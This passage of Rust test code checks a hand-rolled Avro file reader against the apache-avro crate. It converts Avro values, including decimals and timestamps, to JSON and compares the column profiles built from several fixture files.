    /// these functions' only remaining job is producing the "expected"
    /// side of `avro_reader_matches_the_apache_avro_crate_output_exactly`.
    /// A near-verbatim copy of what `columns_from_avro`/`avro_value_to_json`
    /// used to be before that module replaced them.
    #[cfg(all(test, feature = "avro"))]
    fn avro_decimal_to_string_via_apache_avro_crate(
        decimal: apache_avro::Decimal,
        scale: usize,
    ) -> String {
        let unscaled: num_bigint::BigInt = decimal.into();
        let signed = unscaled.to_string();
        let (negative, digits) = match signed.strip_prefix('-') {
            Some(rest) => (true, rest.to_string()),
            None => (false, signed),
        };
        let mut out = if digits.len() <= scale {
            format!("{}{digits}", "0".repeat(scale + 1 - digits.len()))
        } else {
            digits
        };
        if scale > 0 {
            out.insert(out.len() - scale, '.');
        }
        if negative {
            out.insert(0, '-');
        }
        out
    }

    #[cfg(all(test, feature = "avro"))]
    fn avro_value_to_json_via_apache_avro_crate(
        v: &apache_avro::types::Value,
        schema: Option<&apache_avro::Schema>,
    ) -> JsonValue {
        use apache_avro::Schema;
        use apache_avro::types::Value as AvroValue;
        match v {
            AvroValue::Null => JsonValue::Null,
            AvroValue::Boolean(b) => JsonValue::Bool(*b),
            AvroValue::Int(i) => JsonValue::Number((*i).into()),
            AvroValue::Long(i) => JsonValue::Number((*i).into()),
            AvroValue::Float(f) => serde_json::Number::from_f64(f64::from(*f))
                .map_or(JsonValue::Null, JsonValue::Number),
            AvroValue::Double(f) => {
                serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
            }
            AvroValue::String(s) | AvroValue::Enum(_, s) => JsonValue::String(s.clone()),
            AvroValue::Bytes(b) | AvroValue::Fixed(_, b) => {
                JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
            }
            AvroValue::Union(idx, inner) => {
                let variant_schema = match schema {
                    Some(Schema::Union(u)) => u.get_variant(*idx as usize).ok(),
                    _ => None,
                };
                avro_value_to_json_via_apache_avro_crate(inner, variant_schema)
            }
            AvroValue::Array(items) => {
                let item_schema = match schema {
                    Some(Schema::Array(a)) => Some(a.items.as_ref()),
                    _ => None,
                };
                JsonValue::Array(
                    items
                        .iter()
                        .map(|i| avro_value_to_json_via_apache_avro_crate(i, item_schema))
                        .collect(),
                )
            }
            AvroValue::Map(m) => {
                let value_schema = match schema {
                    Some(Schema::Map(ms)) => Some(ms.types.as_ref()),
                    _ => None,
                };
                JsonValue::Object(
                    m.iter()
                        .map(|(k, v)| {
                            (
                                k.clone(),
                                avro_value_to_json_via_apache_avro_crate(v, value_schema),
                            )
                        })
                        .collect(),
                )
            }
            AvroValue::Record(fields) => {
                let record_schema = match schema {
                    Some(Schema::Record(rs)) => Some(rs),
                    _ => None,
                };
                JsonValue::Object(
                    fields
                        .iter()
                        .map(|(k, v)| {
                            let field_schema = record_schema.and_then(|rs| {
                                rs.lookup
                                    .get(k)
                                    .and_then(|&i| rs.fields.get(i))
                                    .map(|f| &f.schema)
                            });
                            (
                                k.clone(),
                                avro_value_to_json_via_apache_avro_crate(v, field_schema),
                            )
                        })
                        .collect(),
                )
            }
            AvroValue::Date(days) => EpochDate::from_days(i64::from(*days))
                .map_or(JsonValue::Null, |d| JsonValue::String(d.format_ymd())),
            AvroValue::Uuid(u) => JsonValue::String(u.to_string()),
            AvroValue::TimestampMillis(ms) | AvroValue::LocalTimestampMillis(ms) => {
                EpochDateTime::from_unix_millis(*ms)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(3)))
            }
            AvroValue::TimestampMicros(us) | AvroValue::LocalTimestampMicros(us) => {
                EpochDateTime::from_unix_micros(*us)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(6)))
            }
            AvroValue::TimestampNanos(ns) | AvroValue::LocalTimestampNanos(ns) => {
                let secs = ns.div_euclid(1_000_000_000);
                let subsec_nanos = ns.rem_euclid(1_000_000_000) as u32;
                EpochDateTime::from_unix_seconds(secs, subsec_nanos)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(9)))
            }
            AvroValue::TimeMillis(ms) => {
                let secs = (ms.div_euclid(1000)).rem_euclid(86_400) as u32;
                let nanos = ms.rem_euclid(1000) as u32 * 1_000_000;
                EpochTime::from_seconds_since_midnight(secs, nanos)
                    .map_or(JsonValue::Null, |t| JsonValue::String(t.format_hms_frac(3)))
            }
            AvroValue::TimeMicros(us) => {
                let secs = (us.div_euclid(1_000_000)).rem_euclid(86_400) as u32;
                let nanos = us.rem_euclid(1_000_000) as u32 * 1000;
                EpochTime::from_seconds_since_midnight(secs, nanos)
                    .map_or(JsonValue::Null, |t| JsonValue::String(t.format_hms_frac(6)))
            }
            AvroValue::Decimal(d) => match schema {
                Some(Schema::Decimal(ds)) => JsonValue::String(
                    avro_decimal_to_string_via_apache_avro_crate(d.clone(), ds.scale),
                ),
                _ => JsonValue::String(format!("{d:?}")),
            },
            AvroValue::BigDecimal(bg) => JsonValue::String(bg.to_string()),
            other => JsonValue::String(format!("{other:?}")),
        }
    }

    #[cfg(all(test, feature = "avro"))]
    fn columns_from_avro_via_apache_avro_crate(
        path: &Path,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use apache_avro::Reader as AvroReader;

        let file = std::fs::File::open(path)?;
        let reader = AvroReader::new(file)?;
        let schema = reader.writer_schema().clone();

        let mut values: Vec<JsonValue> = Vec::new();
        for value_result in reader {
            let value = value_result?;
            values.push(avro_value_to_json_via_apache_avro_crate(
                &value,
                Some(&schema),
            ));
        }

        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!("just checked every value is an object"),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }

    /// Cross-verification oracle for the hand-rolled Avro reader
    /// (`avro_support` - see Cargo.toml) against the real `apache-avro`
    /// crate, kept as a dev-only dependency for exactly this purpose.
    #[cfg(feature = "avro")]
    #[test]
    fn avro_reader_matches_the_apache_avro_crate_output_exactly() {
        for f in [
            "tests/fixtures/sample.avro",
            "tests/fixtures/type_detection.avro",
            "tests/fixtures/avro_logical_types.avro",
            "tests/fixtures/edge_avro_scalar_records.avro",
            "tests/fixtures/edge_avro_snappy_codec.avro",
            "tests/fixtures/edge_avro_named_type_refs.avro",
        ] {
            let path = Path::new(f);
            let mine = avro_support::columns_from_avro(path, None, 100)
                .unwrap_or_else(|e| panic!("{f}: hand-rolled reader failed: {e:?}"));
            let theirs = columns_from_avro_via_apache_avro_crate(path, 100)
                .unwrap_or_else(|e| panic!("{f}: apache-avro-based oracle failed: {e:?}"));

            assert_eq!(
                mine.iter().map(|c| &c.name).collect::<Vec<_>>(),
                theirs.iter().map(|c| &c.name).collect::<Vec<_>>(),
                "{f}: column names differ"
            );
            for (m, t) in mine.iter().zip(theirs.iter()) {
                assert_eq!(
                    m.current_type, t.current_type,
                    "{f} col '{}': current_type",
                    m.name
                );
                assert_eq!(
                    m.ideal_type, t.ideal_type,
                    "{f} col '{}': ideal_type",
                    m.name
                );
                assert_eq!(
                    m.sample_values, t.sample_values,
                    "{f} col '{}': sample_values",
                    m.name
                );
            }
        }
    }
}
